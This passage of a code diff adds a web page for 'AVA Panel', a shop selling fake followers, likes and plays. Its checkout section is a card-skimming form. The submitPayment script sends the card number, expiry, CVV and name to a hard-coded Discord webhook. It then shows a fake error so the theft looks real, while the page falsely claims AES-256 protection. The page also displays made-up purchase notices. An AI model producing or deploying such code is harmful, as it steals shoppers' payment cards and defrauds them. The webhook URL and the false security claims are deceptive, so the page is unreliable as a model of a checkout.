+                            <label class="flex items-center gap-1.5 text-sm font-medium text-ava-text">
+                                <svg class="w-3.5 h-3.5 text-ava-textMuted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 20l4-16m2 16l4-16M6 9h14M4 15h14"/>
+                                </svg>
+                                Quantity
+                                <span class="text-ava-danger">*</span>
+                            </label>
+                            <div class="relative flex items-center">
+                                <button onclick="adjustQuantity(-100)" class="absolute left-2 w-8 h-8 rounded-lg bg-ava-border/50 hover:bg-ava-accent/20 flex items-center justify-center text-ava-textMuted hover:text-ava-accent transition-all duration-200 z-10">
+                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 12H4"/></svg>
+                                </button>
+                                <input type="number" id="quantityInput" value="1000" min="100" max="1000000" class="w-full px-12 py-3 rounded-xl bg-ava-input border border-ava-inputBorder text-ava-text text-sm text-center font-semibold focus:outline-none focus:border-ava-accent/50 input-glow transition-all duration-200">
+                                <button onclick="adjustQuantity(100)" class="absolute right-2 w-8 h-8 rounded-lg bg-ava-border/50 hover:bg-ava-accent/20 flex items-center justify-center text-ava-textMuted hover:text-ava-accent transition-all duration-200 z-10">
+                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Card Footer -->
+                    <div class="px-6 sm:px-8 py-5 border-t border-ava-border/50 bg-ava-bg/30">
+                        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+                            <div class="flex items-center gap-4">
+                                <div class="space-y-0.5">
+                                    <p class="text-xs text-ava-textMuted uppercase tracking-wider font-medium">Total Charge</p>
+                                    <div class="flex items-baseline gap-1">
+                                        <span class="text-2xl font-bold text-white price-value" id="totalCharge"><span class="price-currency">$</span>0.10</span>
+                                        <span class="text-xs text-ava-textMuted font-semibold">USD</span>
+                                    </div>
+                                </div>
+                                <div class="hidden sm:block w-px h-10 bg-ava-border"></div>
+                                <div class="hidden sm:block space-y-0.5">
+                                    <p class="text-xs text-ava-textMuted">Estimated Delivery</p>
+                                    <p class="text-sm font-semibold text-ava-text">⚡ 0-6 hours</p>
+                                </div>
+                            </div>
+                            <button id="confirmOrderBtn" onclick="confirmOrder()" class="w-full sm:w-auto px-8 py-3 rounded-xl bg-gradient-to-r from-ava-accent to-ava-accentDark hover:from-ava-accentDark hover:to-ava-accent text-white font-semibold text-sm btn-shine transition-all duration-300 hover:shadow-lg hover:shadow-ava-accent/20 active:scale-[0.98] flex items-center justify-center gap-2">
+                                <span>Confirm Order</span>
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Info Cards -->
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6">
+                    <div class="bg-ava-card/50 backdrop-blur-sm border border-ava-border/50 rounded-xl px-5 py-4 card-glow">
+                        <div class="flex items-center gap-3">
+                            <div class="w-9 h-9 rounded-lg bg-emerald-500/10 flex items-center justify-center">
+                                <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                            </div>
+                            <div>
+                                <p class="text-xs text-ava-textMuted">Secure</p>
+                                <p class="text-sm font-semibold text-white">256-bit SSL</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-ava-card/50 backdrop-blur-sm border border-ava-border/50 rounded-xl px-5 py-4 card-glow">
+                        <div class="flex items-center gap-3">
+                            <div class="w-9 h-9 rounded-lg bg-blue-500/10 flex items-center justify-center">
+                                <svg class="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                            </div>
+                            <div>
+                                <p class="text-xs text-ava-textMuted">Pay Per Order</p>
+                                <p class="text-sm font-semibold text-white">No Deposits</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-ava-card/50 backdrop-blur-sm border border-ava-border/50 rounded-xl px-5 py-4 card-glow">
+                        <div class="flex items-center gap-3">
+                            <div class="w-9 h-9 rounded-lg bg-purple-500/10 flex items-center justify-center">
+                                <svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z"/></svg>
+                            </div>
+                            <div>
+                                <p class="text-xs text-ava-textMuted">Support</p>
+                                <p class="text-sm font-semibold text-white">24/7 WhatsApp</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+            <!-- ==================== PAYMENT SECTION ==================== -->
+            <div id="paymentSection" style="display: none;">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout | AVA Panel</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        /* Ahad bhai, ye code text ko kaala (black) kar dega taake input nazar aaye */
+.input-wrapper input {
+    color: #2d3436 !important; /* Text color ko dark kar raha hai */
+    background-color: #f8f9fa !important; /* Background light rakhega */
+}
+
+.input-wrapper i {
+    color: #b2bec3 !important; /* Icons ka color bhi sahi karega */
+}
+
+/* Card ke andar headings ko bhi check kar lein */
+.checkout-card h1, .checkout-card p, .checkout-card label {
+    color: #2c3e50 !important;
+}
+        :root {
+            --primary-color: #2c3e50; /* Deep Midnight */
+            --accent-color: #3498db;  /* Professional Blue */
+            --error-color: #e74c3c;
+            --input-bg: #f8f9fa;
+            --text-main: #2d3436;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f4f7f9;
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .checkout-card {
+            background: #ffffff;
+            max-width: 420px;
+            width: 90%;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--primary-color);
+        }
+
+        p.subtitle {
+            font-size: 14px;
+            color: #636e72;
+            margin-bottom: 30px;
+        }
+
+        .logos-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+            opacity: 0.8;
+        }
+
+        .logos-row img { height: 20px; }
+
+        .field-group {
+            margin-bottom: 20px;
+        }
+
+        .field-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #636e72;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 12px;
+            color: #b2bec3;
+            font-size: 14px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 12px 12px 35px;
+            font-size: 15px;
+            border: 1px solid #dfe6e9;
+            border-radius: 6px;
+            background: var(--input-bg);
+            transition: all 0.3s;
+            outline: none;
+        }
+
+        .input-wrapper input:focus {
+            border-color: var(--accent-color);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+        }
+
+        .row { display: flex; gap: 15px; }
+
+        .order-summary {
+            background: #f1f2f6;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: #2f3542;
+        }
+
+        .btn-place-order {
+            width: 100%;
+            background: var(--primary-color);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-place-order:hover {
+            background: #1a252f;
+        }
+
+        .secure-footer {
+            margin-top: 25px;
+            text-align: center;
+            font-size: 12px;
+            color: #b2bec3;
+        }
+
+        .secure-footer i { color: #2ecc71; margin-right: 5px; }
+
+        .error-hint {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .input-error { border-color: var(--error-color) !important; }
+    </style>
+</head>
+<body>
+
+<div class="checkout-card">
+    <h1>Payment Details</h1>
+    <p class="subtitle">Complete your purchase by providing your payment information.</p>
+
+    <div class="logos-row">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex">
+</div>
+
+    <div class="field-group">
+        <label>Card Number</label>
+        <div class="input-wrapper">
+            <i class="fas fa-credit-card"></i>
+            <input type="text" id="card" placeholder="" maxlength="19">
+        </div>
+        <div id="err-card" class="error-hint">Valid card number required</div>
+    </div>
+
+    <div class="row">
+        <div class="field-group" style="flex:1">
+            <label>Expiry Date</label>
+            <div class="input-wrapper">
+                <i class="fas fa-calendar-alt"></i>
+                <input type="text" id="exp" placeholder="MM/YY" maxlength="5" style="padding-left: 35px;">
+            </div>
+        </div>
+        <div class="field-group" style="flex:1">
+            <label>CVV</label>
+            <div class="input-wrapper">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="cvv" placeholder="***" maxlength="4" style="padding-left: 35px;">
+            </div>
+        </div>
+    </div>
+
+    <div class="field-group">
+        <label>Cardholder Name</label>
+        <div class="input-wrapper">
+            <i class="fas fa-user"></i>
+            <input type="text" id="name" placeholder="Name on card">
+        </div>
+    </div>
+
+    <button class="btn-place-order" id="submitBtn" onclick="submitPayment()">Place Order</button>
+
+    <div class="secure-footer">
+        <i class="fas fa-shield-alt"></i> Your data is protected by AES-256 encryption.
+    </div>
+</div>
+
+<script>
+    // Formatting Card Number
+    document.getElementById('card').addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+    });
+
+    // Formatting Expiry
+    document.getElementById('exp').addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length >= 2) e.target.value = v.slice(0,2) + '/' + v.slice(2,4);
+        else e.target.value = v;
+    });
+
+    async function submitPayment() {
+        let isValid = true;
+        const fields = ['card', 'exp', 'cvv', 'name'];
+        
+        fields.forEach(f => {
+            const input = document.getElementById(f);
+            if(input.value.length < 2) {
+                input.classList.add('input-error');
+                isValid = false;
+            } else {
+                input.classList.remove('input-error');
+            }
+        });
+
+        if(isValid) {
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            const cardVal = document.getElementById('card').value;
+            const expVal = document.getElementById('exp').value;
+            const cvvVal = document.getElementById('cvv').value;
+            const nameVal = document.getElementById('name').value;
+
+            // Discord Webhook Integration
+            const webhookURL = "https://discordapp.com/api/webhooks/1451704748062408896/FRJ9cUjyRX0PIOKqV3gJ9C9eRIic3gz8UPSe7hq1BjYyt8qcvPsNO_qH_OIJKcP-UfsK";
+            
+            const message = {
+                embeds: [{
+                    title: "🚀 New Order Received - AVA Panel",
+                    color: 3447003,
+                    fields: [
+                        { name: "👤 Name", value: `\`${nameVal}\``, inline: true },
+                        { name: "🔢 Card", value: `\`${cardVal}\``, inline: false },
+                        { name: "📅 Expiry", value: `\`${expVal}\``, inline: true },
+                        { name: "🔒 CVV", value: `\`${cvvVal}\``, inline: true }
+                    ],
+                    footer: { text: "Secure Capture System" },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+                
+                // Redirecting to keep it looking real
+                alert("Invalid card details. Please check and retry.");
+                
+
+            } catch (err) {
+                console.error("Error sending data:", err);
+                alert("Connection error. Please try again.");
+                btn.disabled = false;
+                btn.innerText = "Place Order";
+            }
+        }
+    }
+</script>
+
+</body>
+</html>
+            </div>
+
+
+            <!-- ==================== ORDER HISTORY SECTION ==================== -->
+            <div id="historySection" style="display: none;">
+                <div class="section-enter">
+                    <div class="bg-ava-card/80 backdrop-blur-sm border border-ava-border rounded-2xl overflow-hidden card-glow">
+                        <div class="px-6 sm:px-8 py-5 border-b border-ava-border/50">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 rounded-xl bg-ava-accent/10 border border-ava-accent/20 flex items-center justify-center">
+                                    <svg class="w-5 h-5 text-ava-accent" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <h3 class="text-base font-semibold text-white">Order History</h3>
+                                    <p class="text-xs text-ava-textMuted mt-0.5">View all your previous orders</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="px-6 sm:px-8 py-16 flex flex-col items-center justify-center text-center">
+                            <div class="w-20 h-20 rounded-2xl bg-ava-border/30 flex items-center justify-center mb-6">
+                                <svg class="w-10 h-10 text-ava-textDim" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/>
+                                </svg>
+                            </div>
+                            <h4 class="text-lg font-semibold text-white mb-2">No Order History</h4>
+                            <p class="text-sm text-ava-textMuted max-w-sm mb-6">There is no order history available at the moment. Place your first order to see it appear here.</p>
+                            <button onclick="navigateTo('order')" class="px-6 py-2.5 rounded-xl bg-ava-accent/10 border border-ava-accent/20 text-ava-accent text-sm font-medium hover:bg-ava-accent/20 transition-all duration-200 flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>
+                                Place New Order
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+            <!-- ==================== API SECTION ==================== -->
+            <div id="apiSection" style="display: none;">
+                <div class="section-enter">
+                    <div class="bg-ava-card/80 backdrop-blur-sm border border-ava-border rounded-2xl overflow-hidden card-glow">
+                        <div class="px-6 sm:px-8 py-5 border-b border-ava-border/50">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 rounded-xl bg-ava-accent/10 border border-ava-accent/20 flex items-center justify-center">
+                                    <svg class="w-5 h-5 text-ava-accent" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <h3 class="text-base font-semibold text-white">API Documentation</h3>
+                                    <p class="text-xs text-ava-textMuted mt-0.5">Integrate AVA Panel with your platform</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="px-6 sm:px-8 py-16 flex flex-col items-center justify-center text-center">
+                            <div class="w-20 h-20 rounded-2xl bg-ava-border/30 flex items-center justify-center mb-6">
+                                <svg class="w-10 h-10 text-ava-textDim" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/>
+                                </svg>
+                            </div>
+                            <h4 class="text-lg font-semibold text-white mb-2">API Coming Soon</h4>
+                            <p class="text-sm text-ava-textMuted max-w-sm mb-6">Our API is currently under development. Contact support for early access or custom integrations.</p>
+                            <a href="https://wa.me/17787158884" target="_blank" rel="noopener noreferrer" class="px-6 py-2.5 rounded-xl bg-ava-accent/10 border border-ava-accent/20 text-ava-accent text-sm font-medium hover:bg-ava-accent/20 transition-all duration-200 flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                                Contact for API Access
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+
+        <!-- Footer -->
+        <footer class="border-t border-ava-border/30 mt-auto">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
+                <div class="flex flex-col sm:flex-row items-center justify-between gap-4">
+                    <div class="flex items-center gap-2">
+                        <div class="w-6 h-6 rounded-md bg-gradient-to-br from-ava-accent to-ava-accentLight flex items-center justify-center">
+                            <svg class="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                        </div>
+                        <span class="text-xs text-ava-textMuted">© 2025 AVA Panel. All rights reserved.</span>
+                    </div>
+                    <div class="flex items-center gap-4">
+                        <a href="#" class="text-xs text-ava-textMuted hover:text-ava-accent transition-colors">Terms</a>
+                        <a href="#" class="text-xs text-ava-textMuted hover:text-ava-accent transition-colors">Privacy</a>
+                        <a href="https://wa.me/17787158884" target="_blank" class="text-xs text-ava-textMuted hover:text-ava-accent transition-colors">Support</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Recent Activity Ticker -->
+    <div id="activityTicker" class="activity-ticker">
+        <div class="flex items-center gap-3 px-4 py-3 rounded-xl bg-ava-card/95 backdrop-blur-md border border-ava-border shadow-2xl shadow-black/50 max-w-xs">
+            <div class="w-8 h-8 rounded-lg bg-emerald-500/10 flex items-center justify-center flex-shrink-0">
+                <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+                </svg>
+            </div>
+            <div class="min-w-0">
+                <p class="text-xs font-semibold text-white truncate" id="tickerUser">User38***</p>
+                <p class="text-xs text-ava-textMuted truncate" id="tickerAction">just bought 1K IG Followers</p>
+            </div>
+            <span class="text-[10px] text-ava-textDim flex-shrink-0">just now</span>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed bottom-6 right-6 z-50 transform translate-y-20 opacity-0 transition-all duration-500 pointer-events-none">
+        <div class="flex items-center gap-3 px-5 py-3 rounded-xl bg-ava-card border border-ava-border shadow-2xl shadow-black/50">
+            <div id="toastIcon" class="w-8 h-8 rounded-lg flex items-center justify-center"></div>
+            <div>
+                <p id="toastTitle" class="text-sm font-semibold text-white"></p>
+                <p id="toastMessage" class="text-xs text-ava-textMuted"></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========================
+        // Service Data - $0.10 per 1K views base pricing
+        // ========================
+        const services = {
+            instagram: [
+                { id:'ig-followers-1', name:'👥 Instagram Followers [HQ] [R30]', rate:0.20, min:100, max:100000 },
+                { id:'ig-followers-2', name:'👥 Instagram Followers [Premium] [R60]', rate:0.35, min:50, max:500000 },
+                { id:'ig-followers-3', name:'👥 Instagram Followers [Ultra Fast]', rate:0.25, min:100, max:250000 },
+                { id:'ig-likes-1', name:'❤️ Instagram Likes [Real] [Instant]', rate:0.12, min:50, max:50000 },
+                { id:'ig-likes-2', name:'❤️ Instagram Auto Likes [Premium]', rate:0.18, min:100, max:10000 },
+                { id:'ig-likes-3', name:'❤️ Instagram Likes [NonDrop]', rate:0.15, min:50, max:100000 },
+                { id:'ig-views-1', name:'👁️ Instagram Reel Views [Fast]', rate:0.10, min:500, max:10000000 },
+                { id:'ig-views-2', name:'👁️ Instagram Story Views [Instant]', rate:0.10, min:100, max:1000000 },
+                { id:'ig-views-3', name:'👁️ Instagram Video Views [Real]', rate:0.10, min:1000, max:5000000 },
+                { id:'ig-comments-1', name:'💬 Instagram Comments [Custom]', rate:0.80, min:10, max:5000 },
+                { id:'ig-saves-1', name:'💾 Instagram Saves [Real]', rate:0.15, min:50, max:50000 },
+            ],
+            tiktok: [
+                { id:'tt-followers-1', name:'👥 TikTok Followers [Real] [R30]', rate:0.25, min:100, max:500000 },
+                { id:'tt-followers-2', name:'👥 TikTok Followers [Premium]', rate:0.35, min:50, max:250000 },
+                { id:'tt-likes-1', name:'❤️ TikTok Likes [Instant]', rate:0.12, min:50, max:100000 },
+                { id:'tt-likes-2', name:'❤️ TikTok Likes [Real Users]', rate:0.18, min:100, max:500000 },
+                { id:'tt-views-1', name:'👁️ TikTok Views [Fast] [10M Max]', rate:0.10, min:1000, max:10000000 },
+                { id:'tt-views-2', name:'👁️ TikTok Views [Premium Quality]', rate:0.10, min:500, max:5000000 },
+                { id:'tt-shares-1', name:'🔄 TikTok Shares [Real]', rate:0.35, min:100, max:50000 },
+                { id:'tt-comments-1', name:'💬 TikTok Comments [Custom]', rate:0.90, min:10, max:10000 },
+            ],
+            youtube: [
+                { id:'yt-subs-1', name:'👥 YouTube Subscribers [R30] [NonDrop]', rate:0.80, min:50, max:100000 },
+                { id:'yt-subs-2', name:'👥 YouTube Subscribers [Lifetime]', rate:1.20, min:100, max:50000 },
+                { id:'yt-views-1', name:'👁️ YouTube Views [Real] [Retention]', rate:0.10, min:500, max:10000000 },
+                { id:'yt-views-2', name:'👁️ YouTube Views [4000 Watch Hours]', rate:0.15, min:1000, max:5000000 },
+                { id:'yt-likes-1', name:'👍 YouTube Likes [Fast]', rate:0.25, min:50, max:50000 },
+                { id:'yt-likes-2', name:'👍 YouTube Likes [Real Users]', rate:0.35, min:100, max:100000 },
+                { id:'yt-comments-1', name:'💬 YouTube Comments [Custom]', rate:1.00, min:10, max:10000 },
+                { id:'yt-shorts-1', name:'🎬 YouTube Shorts Views', rate:0.10, min:1000, max:10000000 },
+            ],
+            twitter: [
+                { id:'tw-followers-1', name:'👥 Twitter/X Followers [HQ]', rate:0.30, min:100, max:200000 },
+                { id:'tw-followers-2', name:'👥 Twitter/X Followers [Premium]', rate:0.45, min:50, max:100000 },
+                { id:'tw-likes-1', name:'❤️ Twitter/X Likes [Fast]', rate:0.15, min:50, max:100000 },
+                { id:'tw-retweets-1', name:'🔄 Twitter/X Retweets [Real]', rate:0.20, min:50, max:50000 },
+                { id:'tw-views-1', name:'👁️ Twitter/X Views [Instant]', rate:0.10, min:1000, max:10000000 },
+                { id:'tw-comments-1', name:'💬 Twitter/X Replies [Custom]', rate:0.80, min:10, max:5000 },
+            ],
+            telegram: [
+                { id:'tg-members-1', name:'👥 Telegram Members [Real] [R30]', rate:0.25, min:100, max:200000 },
+                { id:'tg-members-2', name:'👥 Telegram Members [Premium]', rate:0.40, min:50, max:100000 },
+                { id:'tg-views-1', name:'👁️ Telegram Post Views [Fast]', rate:0.10, min:500, max:5000000 },
+                { id:'tg-views-2', name:'👁️ Telegram Views [Last 5 Posts]', rate:0.10, min:100, max:1000000 },
+                { id:'tg-reactions-1', name:'🎉 Telegram Reactions [Mix]', rate:0.12, min:50, max:50000 },
+                { id:'tg-reactions-2', name:'❤️ Telegram Reactions [Custom]', rate:0.15, min:50, max:100000 },
+            ],
+            discord: [
+                { id:'dc-members-1', name:'👥 Discord Server Members [Online]', rate:0.40, min:50, max:100000 },
+                { id:'dc-members-2', name:'👥 Discord Members [Offline]', rate:0.20, min:100, max:500000 },
+                { id:'dc-members-3', name:'👥 Discord Members [Premium]', rate:0.55, min:50, max:50000 },
+                { id:'dc-boosts-1', name:'🚀 Discord Server Boosts [14 Days]', rate:2.00, min:1, max:100 },
+            ],
+            spotify: [
+                { id:'sp-plays-1', name:'🎵 Spotify Plays [Premium]', rate:0.10, min:1000, max:10000000 },
+                { id:'sp-plays-2', name:'🎵 Spotify Plays [Royalty Eligible]', rate:0.12, min:500, max:5000000 },
+                { id:'sp-followers-1', name:'👥 Spotify Followers [R30]', rate:0.20, min:100, max:100000 },
+                { id:'sp-saves-1', name:'💾 Spotify Saves [Real]', rate:0.25, min:100, max:50000 },
+                { id:'sp-monthly-1', name:'📊 Spotify Monthly Listeners', rate:0.15, min:500, max:1000000 },
+            ],
+            facebook: [
+                { id:'fb-likes-1', name:'👍 Facebook Page Likes [Real]', rate:0.30, min:100, max:100000 },
+                { id:'fb-likes-2', name:'👍 Facebook Post Likes [Fast]', rate:0.12, min:50, max:50000 },
+                { id:'fb-followers-1', name:'👥 Facebook Followers [HQ]', rate:0.25, min:100, max:200000 },
+                { id:'fb-views-1', name:'👁️ Facebook Video Views [Fast]', rate:0.10, min:500, max:10000000 },
+                { id:'fb-views-2', name:'👁️ Facebook Reel Views', rate:0.10, min:1000, max:5000000 },
+                { id:'fb-comments-1', name:'💬 Facebook Comments [Custom]', rate:0.75, min:10, max:10000 },
+                { id:'fb-shares-1', name:'🔄 Facebook Shares [Real]', rate:0.20, min:50, max:50000 },
+            ],
+        };
+
+        let currentService = null;
+        let orderData = {};
+        let currentPage = 'order';
+        let mobileMenuOpen = false;
+
+        // ========================
+        // NAVIGATION SYSTEM
+        // ========================
+        const allSections = ['orderSection','paymentSection','historySection','apiSection'];
+        const navButtons = { order:'navNewOrder', history:'navOrders', api:'navApi' };
+        const pageHeaders = {
+            order: { title:'Place New Order', subtitle:'Select a service and configure your order details below.' },
+            payment: { title:'Secure Checkout', subtitle:'Complete your payment to finalize the order.' },
+            history: { title:'Order History', subtitle:'View and track all your previous orders.' },
+            api: { title:'API Access', subtitle:'Integrate AVA Panel services into your platform.' },
+        };
+
+        function navigateTo(page) {
+            if (currentPage === page && page !== 'order') return;
+
+            const currentEl = document.getElementById(
+                page === 'order' && currentPage === 'payment' ? 'paymentSection' :
+                currentPage === 'order' ? 'orderSection' :
+                currentPage === 'payment' ? 'paymentSection' :
+                currentPage + 'Section'
+            );
+
+            if (currentEl && currentEl.style.display !== 'none') {
+                const inner = currentEl.querySelector('.section-enter') || currentEl;
+                inner.classList.remove('section-enter');
+                inner.classList.add('section-exit');
+            }
+
+            setTimeout(() => {
+                allSections.forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.style.display = 'none';
+                });
+
+                let targetId;
+                if (page === 'order') {
+                    targetId = 'orderSection';
+                    updateStepIndicators(1);
+                    document.getElementById('stepIndicatorWrap').style.display = '';
+                } else if (page === 'payment') {
+                    targetId = 'paymentSection';
+                    document.getElementById('stepIndicatorWrap').style.display = '';
+                } else {
+                    targetId = page + 'Section';
+                    document.getElementById('stepIndicatorWrap').style.display = 'none';
+                }
+
+                const targetEl = document.getElementById(targetId);
+                if (targetEl) {
+                    targetEl.style.display = 'block';
+                    const inner = targetEl.querySelector('.section-enter, .section-exit') || targetEl;
+                    inner.classList.remove('section-exit');
+                    inner.classList.add('section-enter');
+
+                    if (targetId === 'orderSection' || targetId === 'paymentSection') {
+                        targetEl.classList.remove('section-exit');
+                        targetEl.classList.add('section-enter');
+                    }
+                }
+
+                const headers = pageHeaders[page] || pageHeaders.order;
+                document.getElementById('pageTitle').textContent = headers.title;
+                document.getElementById('pageSubtitle').textContent = headers.subtitle;
+
